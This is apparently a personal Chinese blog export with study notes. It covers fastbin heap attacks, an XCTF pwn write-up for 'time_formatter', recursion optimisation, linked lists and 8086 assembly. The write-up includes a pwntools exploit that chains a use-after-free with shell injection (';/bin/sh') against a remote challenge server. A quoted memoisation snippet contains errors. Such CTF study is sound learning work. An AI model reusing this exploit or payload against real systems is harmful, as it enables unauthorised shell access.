<p>over！</p>
<h1 id="FASTBIN有关的漏洞"><a href="#FASTBIN有关的漏洞" class="headerlink" title="FASTBIN有关的漏洞"></a>FASTBIN有关的漏洞</h1><ol>
<li>fastbin double free</li>
<li>house of spirit</li>
<li>alloc to stack</li>
<li>arbitrary alloc</li>
</ol>
<p>前两种主要侧重利用free函数释放真的或者伪造的chunk，然后再申请chunk进行攻击；后两种侧重于修改fd指针，利用malloc申请执行位置的chunk<br>原理在于，fastbin由单链表维护，并且fastbin中的chunk即使释放了，next_chunk的pre_inuse位也不会清空</p>
]]></content>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>xctf堆溢出WP（1）</title>
    <url>/61126.html</url>
    <content><![CDATA[<p>…<br><a id="more"></a></p>
<h2 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h2><p>接触到的第一个堆漏洞题</p>
<p>首先checksec：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec 5</span><br><span class="line">[*] <span class="string">'/home/pluto/Desktop/5'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>（开启了FORTIFY_SOURCE对格式化字符串有两个影响：<br>1.包含%n的格式化字符串不能位于程序内存中的可写地址。<br>2.当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。）</p>
</blockquote>
<p>运行程序&amp;ida-f5：<br>主函数是一个选择菜单，修改函数名后如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)menu(v4) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          v5 = set_time_format(v4, <span class="string">"&gt; "</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">          v5 = set_time(v4, <span class="string">"&gt; "</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">          v5 = set_time_zone();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">          v5 = print_time(v4, <span class="string">"&gt; "</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">          v5 = exit_program(v4, <span class="string">"&gt; "</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中1和3两个选项对应的函数用到了动态分配的内存，函数2把输入的值放到了bss段</span></span><br><span class="line"><span class="comment">//不同的是函数1对输入进行了判断，函数2没有判断：</span></span><br><span class="line"></span><br><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_400CB5</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> accept; <span class="comment">// [rsp+5h] [rbp-43h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;accept, <span class="string">"%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# "</span>);</span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strspn</span>(s, &amp;accept) == <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//目前还不知道这个判断有什么作用</span></span><br></pre></td></tr></table></figure><br>继续往函数4和5看下去<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">print_time</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [rsp+8h] [rbp-810h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(&amp;command, <span class="number">2048L</span>L, <span class="number">1L</span>L, <span class="number">2048L</span>L, <span class="string">"/bin/date -d @%d +'%s'"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602120, ptr, a3);</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"Your formatted time is: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getenv(<span class="string">"DEBUG"</span>) )</span><br><span class="line">      __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1L</span>L, <span class="string">"Running command: %s\n"</span>, &amp;command);</span><br><span class="line">    setenv(<span class="string">"TZ"</span>, value, <span class="number">1</span>);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You haven't specified a format!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">`/bin/date -d @%d +'%s'`是一个shell注入。</span></span><br><span class="line"><span class="comment">在命令行中，多个命令可以用分号隔开，执行时会依次运行。我们需要把它构造成：“/bin/data -d @0 + ";/bin/sh"”</span></span><br><span class="line"><span class="comment">但是由于传入的format在输入时就被限制了，所以不能直接通过format就让它执行我们想要的操作</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">exit_program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  free_0(ptr);</span><br><span class="line">  free_0(value);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Are you sure you want to exit (y/N)? "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (s &amp; <span class="number">0xDF</span>) == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"OK, exiting."</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里，如果执行到函数5，会先释放format和time_zone的内存，然后再询问是否退出。</span></span><br><span class="line"><span class="comment">//但并没有在free之后立刻改变指针指向的位置，造成了uaf漏洞</span></span><br></pre></td></tr></table></figure></p>
<p>所以大概的思路就有了：</p>
<ol>
<li>先产生一个存放format的空间然后释放，释放后指针F依旧指向这块内存，这块小空间被放在fastbin的头部，下一次分配内存时如果大小合适将首先将它分配出去</li>
<li>进入函数3，输入payload，此时payload将放入原先放置format空间</li>
<li>进入函数4，执行system(“/bin/sh”)，getshell</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"220.249.52.133"</span>, <span class="number">32519</span>)</span><br><span class="line"><span class="comment">#p = process("./5")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mass</span><span class="params">(ch,data)</span>:</span></span><br><span class="line">	p.sendline(ch)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> len(data)&gt;<span class="number">0</span>:</span><br><span class="line">		p.sendline(data)</span><br><span class="line"></span><br><span class="line">mass(<span class="string">"1"</span>,<span class="string">"a"</span>)</span><br><span class="line">mass(<span class="string">"5"</span>,<span class="string">"N"</span>)</span><br><span class="line">mass(<span class="string">"3"</span>,<span class="string">'\';/bin/sh\''</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">mass(<span class="string">"4"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2019.12.01-2019.12.07</title>
    <url>/34683.html</url>
    <content><![CDATA[<h2 id="1-洛谷-P1028-数的计算"><a href="#1-洛谷-P1028-数的计算" class="headerlink" title="1.洛谷-P1028 数的计算"></a>1.洛谷-P1028 数的计算</h2><p><img src="https://img-blog.csdnimg.cn/2019120714254339.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><a id="more"></a><br>第一次写的时候大概思路：<img src="https://img-blog.csdnimg.cn/20191207142716854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n/<span class="number">2</span>; i++)</span><br><span class="line">		sum=sum+cal(i);</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d"</span>,cal(n));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果有15个超时了。<br>前几天看别人的题解没看懂，打算写完周报再看一下。</p>
<h2 id="2-递归优化"><a href="#2-递归优化" class="headerlink" title="2.递归优化"></a>2.递归优化</h2><blockquote>
<p>有关递归的一些优化思路1. 考虑是否重复计算告诉你吧，如果你使用递归的时候不进行优化，是有非常非常非常多的子问题被重复计算的。 啥是子问题？ f(n-1),f(n-2)….就是 f(n) 的子问题了。例如对于案例2那道题，f(n) = f(n-1) + f(n-2)。递归调用的状态图如下：<img src="https://pic2.zhimg.com/v2-32f657a7a8e409a130f196fc34948291_b.jpg" data-caption="" data-size="normal" data-rawwidth="729" data-rawheight="444" data-default-watermark-src="https://pic1.zhimg.com/v2-45ac6014f7b3cf95a66b50126b80a990_b.jpg" class="origin_image zh-lightbox-thumb" width="729" data-original="https://pic2.zhimg.com/v2-32f657a7a8e409a130f196fc34948291_r.jpg"/>看到没有，递归计算的时候，重复计算了两次 f(5)，五次 f(4)。。。。这是非常恐怖的，n 越大，重复计算的就越多，所以我们必须进行优化。如何优化？一般我们可以把我们计算的结果保证起来，例如把 f(4) 的计算结果保证起来，当再次要计算 f(4) 的时候，我们先判断一下，之前是否计算过，如果计算过，直接把 f(4) 的结果取出来就可以了，没有计算过的话，再递归计算。用什么保存呢？可以用数组或者 HashMap 保存，我们用数组来保存把，把 n 作为我们的数组下标，f(n) 作为值，例如 arr[n] = f(n)。f(n) 还没有计算过的时候，我们让 arr[n] 等于一个特殊值，例如 arr[n] = -1。当我们要判断的时候，如果 arr[n] = -1，则证明 f(n) 没有计算过，否则， f(n) 就已经计算过了，且 f(n) = arr[n]。直接把值取出来就行了。代码如下：// 我们实现假定 arr 数组已经初始化好的了。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//先判断有没计算过</span></span><br><span class="line">    <span class="keyword">if</span>(arr[n] != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">//计算过，直接返回</span></span><br><span class="line">        <span class="keyword">return</span> arr[n];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 没有计算过，递归计算,并且把结果保存到 arr数组里</span></span><br><span class="line">        arr[n] = f(n<span class="number">-1</span>) + f(n<span class="number">-1</span>);</span><br><span class="line">        reutrn arr[n];</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>也就是说，使用递归的时候，必要 须要考虑有没有重复计算，如果重复计算了，一定要把计算过的状态保存起来。2. 考虑是否可以自底向上对于递归的问题，我们一般都是从上往下递归的，直到递归到最底，再一层一层着把值返回。不过，有时候当 n 比较大的时候，例如当 n = 10000 时，那么必须要往下递归10000层直到 n &lt;=1 才将结果慢慢返回，如果n太大的话，可能栈空间会不够用。对于这种情况，其实我们是可以考虑自底向上的做法的。例如我知道f(1) = 1;f(2) = 2;那么我们就可以推出 f(3) = f(2) + f(1) = 3。从而可以推出f(4),f(5)等直到f(n)。因此，我们可以考虑使用自底向上的方法来取代递归，代码如下：</p>
</blockquote>
<figure class="highlight plain"><figcaption><span>int f(int n) &#123;</span></figcaption><table><tr><td class="code"><pre><span class="line">public int f(int n) &#123;</span><br><span class="line">       if(n &lt;&#x3D; 2)</span><br><span class="line">           return n;</span><br><span class="line">       int f1 &#x3D; 1;</span><br><span class="line">       int f2 &#x3D; 2;</span><br><span class="line">       int sum &#x3D; 0;</span><br><span class="line">       for (int i &#x3D; 3; i &lt;&#x3D; n; i++) &#123;</span><br><span class="line">           sum &#x3D; f1 + f2;</span><br><span class="line">           f1 &#x3D; f2;</span><br><span class="line">           f2 &#x3D; sum;</span><br><span class="line">       &#125;</span><br><span class="line">       return sum;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这种方法，其实也被称之为递推。<br>    作者：帅地<br>链接：<a href="https://www.zhihu.com/question/31412436/answer/683820765" target="_blank" rel="noopener">https://www.zhihu.com/question/31412436/answer/683820765</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<h2 id="2-链表的查找"><a href="#2-链表的查找" class="headerlink" title="2.链表的查找"></a>2.链表的查找</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(struct stud *p)</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stud</span> *<span class="title">p1</span>=<span class="title">p</span>;</span></span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"find:1.num or 2.name?   "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(num==<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"type a name:   "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s"</span>,name);</span><br><span class="line">		getchar();</span><br><span class="line">			<span class="keyword">while</span>(p1-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(name,p1-&gt;name)!=<span class="number">0</span>)&#123;</span><br><span class="line">				p1=p1-&gt;next;</span><br><span class="line">				num++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,num);</span><br><span class="line">				flag=<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"not found\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"type a number:   "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">		<span class="keyword">while</span>(i!=num&amp;&amp;p1-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			p1=p1-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(p1-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"wrong number"</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,p1-&gt;name);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最开始写的时候把num和name[10]放在一个共用体里，没考虑到共用体里只能有一个成员有值…..</p>
<h2 id="3-汇编语言学习："><a href="#3-汇编语言学习：" class="headerlink" title="3.汇编语言学习："></a>3.汇编语言学习：</h2><h3 id="1-存储单元："><a href="#1-存储单元：" class="headerlink" title="1-存储单元："></a>1-存储单元：</h3><pre><code>bit（一个二进制位），8位bit，8个bit组成一个byte（字节）
</code></pre><h3 id="2-cpu对存储器的读写："><a href="#2-cpu对存储器的读写：" class="headerlink" title="2-cpu对存储器的读写："></a>2-cpu对存储器的读写：</h3><p>和外部器件进行三类信息交互：</p>
<pre><code>    1.存储单元的地址（地址信息）；
    2.器件的选择，读或写（控制信息）；
    3.读或写的数据（数据信息）；
cpu通过总线传输信息，总线分为：地址，， 控制，， 数据，，
一个cpu有n根地址线，可一次传送n位二进制数据，地址总线宽度为n，
这样的cpu 最多可以对2^n个内存单元进行寻址
控制总线  ：“读信号输出”    “写信号输出”
</code></pre><p>存储器芯片：</p>
<pre><code>读写属性：随机存储器（ram）只读存储器（rom）
功能和连接：
    随机存储器，存放供cpu使用的绝大部分程序和数据
    接口卡上的ram，如显存
    装有bios的rom（在主板和各类接口卡上，如显卡，网卡）
</code></pre><p>内存地址空间：<br>    内存地址空间地址段分配<br>    基于硬件系统编程必须知道这个系统中的内存地址空间分配情况，想在某类存储器中读写数据的时候必须知道它的第一个单元的地址和最后一个单元的地址<br><img src="https://img-blog.csdnimg.cn/20191205180311107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="3-汇编指令："><a href="#3-汇编指令：" class="headerlink" title="3-汇编指令："></a>3-汇编指令：</h3><p>不区分大小写</p>
<p>mov ah,78        ==        将18送入寄存器ax<br>mov ax,bx         ==        将寄存器bx中的数据送入寄存器ax<br>add ax,bx        ==        将ax和bx中的数值相加，结果存在ax中</p>
<p>ax中数值为00C5H，执行add al，93H 后，ax中数据为：0058H，不为0058H，因为此时al是作为一个独立的8位寄存器，与ah没有关系。</p>
<p>8086cpu<br>16位结构（16位机、字长为16位）：<br>1.运算器一次最多可以处理16位的数据<br>2.寄存器的最大宽度为16位<br>3.运算器和寄存器之间的通路为16位</p>
<p>两个16位地址（段地址、偏移地址）合成一个20位物理地址<br>段地址和偏移地址通过内部总线送入地址加法器，合成后通过内部总线—&gt;输入输出控制电路—&gt;地址总线—&gt;存储器<br>地址加法器中，物理地址=段地址 <em>16+偏移地址<br>（段地址 </em>16表现为16进制时向左移一位，2进制时移动4位）<br>（一个x进制的数据向左移动n位，相当于乘以x^n)</p>
<p>内存没有分段，段的划分来自于cpu，cpu可以用不同段地址和偏移地址形成同一个物理地址<br>对于8086pc机，“数据在21F60H内存单元中”=“数据存在内存2000：1F60单元中”=”数据存在内存的2000H段中的1F60H单元中”</p>
<h3 id="4-段寄存器（segment-register）"><a href="#4-段寄存器（segment-register）" class="headerlink" title="4.-段寄存器（segment register）"></a>4.-段寄存器（segment register）</h3><p>提供段地址<br>6个段寄存器：<br>cs（code）<br>ds（data）<br>ss（stack）<br>es（extra）<br>*32位：fs（flag）gs（global）</p>
<h3 id="5-CS、IP"><a href="#5-CS、IP" class="headerlink" title="5-CS、IP"></a>5-CS、IP</h3><p>cs为代码段寄存器，IP为指令指针寄存器<br>物理地址=CS *16+IP</p>
<p>cpu读取指令后，指令进入指令缓冲器，IP的值自动增加，增加长度等于当前读入指令长度</p>
<p>cpu刚开始工作时，CS=FFFFH,IP=0000H,即从FFFF0H单元读取指令执行。<br>改变CS、IP的值的指令统称为转移指令，如jmp<br>同时修改CS、IP:jmp 段地址:偏移地址<br>只修改IP:jmp 某一合法寄存器（如ax/bx）在含义上好似： mov IP,ax</p>
<h3 id="6-字单元："><a href="#6-字单元：" class="headerlink" title="6-字单元："></a>6-字单元：</h3><p>存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成，高地址内存单元中存放字型数据的高位字节，，，，，<br>起始地址为n的字单元简称为n地址字单元</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.10-2020.02.16</title>
    <url>/34199.html</url>
    <content><![CDATA[<h1 id="汇编学习"><a href="#汇编学习" class="headerlink" title="汇编学习"></a>汇编学习</h1><h2 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h2><p>功能是取得标号的偏移地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">    start:mov ax,offset start</span><br><span class="line">    &lt;!-- 相当于mov ax,0 --&gt;</span><br><span class="line">    s:mov ax,offstet s</span><br><span class="line">    &lt;!-- 相当于mov ax,3 --&gt;</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>offset取得了标号start和s的偏移地址：0和3<br><a id="more"></a></p>
<h2 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h2><h3 id="依据位移进行转移的jmp指令"><a href="#依据位移进行转移的jmp指令" class="headerlink" title="依据位移进行转移的jmp指令"></a>依据位移进行转移的jmp指令</h3><h4 id="1-jmp-short-标号"><a href="#1-jmp-short-标号" class="headerlink" title="1.jmp short 标号"></a>1.jmp short 标号</h4><p>实现段内短转移，对ip修改范围为：-128~127字节<br>例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">start:mov ax,0</span><br><span class="line">      jmp short s</span><br><span class="line">      add ax,1</span><br><span class="line">    s:inc ax</span><br><span class="line">....</span><br></pre></td></tr></table></figure><br>执行后ax=1  </p>
<p>“依据位移进行转移”:指令对应的机器码中不包含转移的目的地址，而是转移的位移，位移由编译器根据汇编指令计算  </p>
<p>jmp short 标号 == （ip）+=8位位移  </p>
<ul>
<li>8位位移=标号处的地址 - jmp指令后第一个字节的地址</li>
<li>short 指明位移为8位</li>
<li>8位位移在编译时算出，在机器码中用补码表示</li>
</ul>
<h4 id="2-jmp-near-ptr-标号"><a href="#2-jmp-near-ptr-标号" class="headerlink" title="2.jmp near ptr 标号"></a>2.jmp near ptr 标号</h4><p>与jump short 标号 相似<br>功能为：ip+16位位移</p>
<h3 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h3><h4 id="1-jmp-far-ptr-标号"><a href="#1-jmp-far-ptr-标号" class="headerlink" title="1.jmp far ptr 标号"></a>1.jmp far ptr 标号</h4><p>用标号的段地址和偏移地址修改cs和ip<br>实现的是段间转移（远转移）<br>功能为：<br>&emsp;(cs)=标号所在段地址&emsp;<br>（ip）=标号所在偏移地址<br><strong>机器码：EA0B01BD0B</strong><br><strong>对应：jmp 0BBD:0B01</strong></p>
<h3 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的jmp指令</h3><h4 id="1-jmp-16位寄存器"><a href="#1-jmp-16位寄存器" class="headerlink" title="1.jmp 16位寄存器"></a>1.jmp 16位寄存器</h4><p>（ip）=（16位寄存器）</p>
<h3 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h3><h4 id="1-jmp-word-ptr-内存单元地址（段内转移）"><a href="#1-jmp-word-ptr-内存单元地址（段内转移）" class="headerlink" title="1.jmp word ptr 内存单元地址（段内转移）"></a>1.jmp word ptr 内存单元地址（段内转移）</h4><p>内存单元地址处开始存放的一个字作为偏移地址<br>内存单元地址可用寻址方式的任一格式给出</p>
<h4 id="2-jmp-dword-ptr-内存单元地址（段间转移）"><a href="#2-jmp-dword-ptr-内存单元地址（段间转移）" class="headerlink" title="2.jmp dword ptr 内存单元地址（段间转移）"></a>2.jmp dword ptr 内存单元地址（段间转移）</h4><p>高地址处的字是转移到目的地段地址，低地址处是转移到目的偏移地址：<br>&emsp;（cs）=（内存单元地址+2）<br>&emsp;（ip）=（内存单元地址)</p>
<p>如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,0123</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure><br>(cs)=0,(ip)=0123</p>
<h2 id="jcxz"><a href="#jcxz" class="headerlink" title="jcxz"></a>jcxz</h2><p>为有条件转移指令 </p>
<p><em>所有有条件的转移指令都是短转移，在机器码中包含的是位移而不是目的地址，ip修改范围为：-128~127</em></p>
<p>格式：jcxz 标号<br>相当于：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if((cx)&#x3D;&#x3D;0)</span><br><span class="line">    jmp short 标号</span><br></pre></td></tr></table></figure></p>
<h2 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h2><p><em>所有循环指令都是短转移在机器码中包含的是位移而不是目的地址，ip修改范围为：-128~127</em><br>格式：loop 标号<br>相当于：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(cx)--;</span><br><span class="line">if((cx)!&#x3D;0)</span><br><span class="line">    jmp short 标号;</span><br></pre></td></tr></table></figure></p>
<h2 id="根据位移进行转移的意义"><a href="#根据位移进行转移的意义" class="headerlink" title="根据位移进行转移的意义"></a>根据位移进行转移的意义</h2><p>在机器码中包含的是位移而不是目的地址—-这种设计方便了程序段在内存中的浮动装配，在不同位置都可正确执行</p>
<h2 id="call和ret指令"><a href="#call和ret指令" class="headerlink" title="call和ret指令"></a>call和ret指令</h2><p>call和ret都是转移指令，修改ip或同时修改cs和ip</p>
<h3 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h3><p>ret用栈中的数据修改ip实现近转移，相当于:<br>pop ip<br>retf用栈中的数据修改cs和ip实现远转移，相当于:<br>&emsp;pop ip<br>&emsp;pop cs<br>&emsp;</p>
<h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p>CPU执行call时：<br>1.将ip或cs和ip压入栈<br>2.实现长转移<br><strong>call不能实现短转移</strong></p>
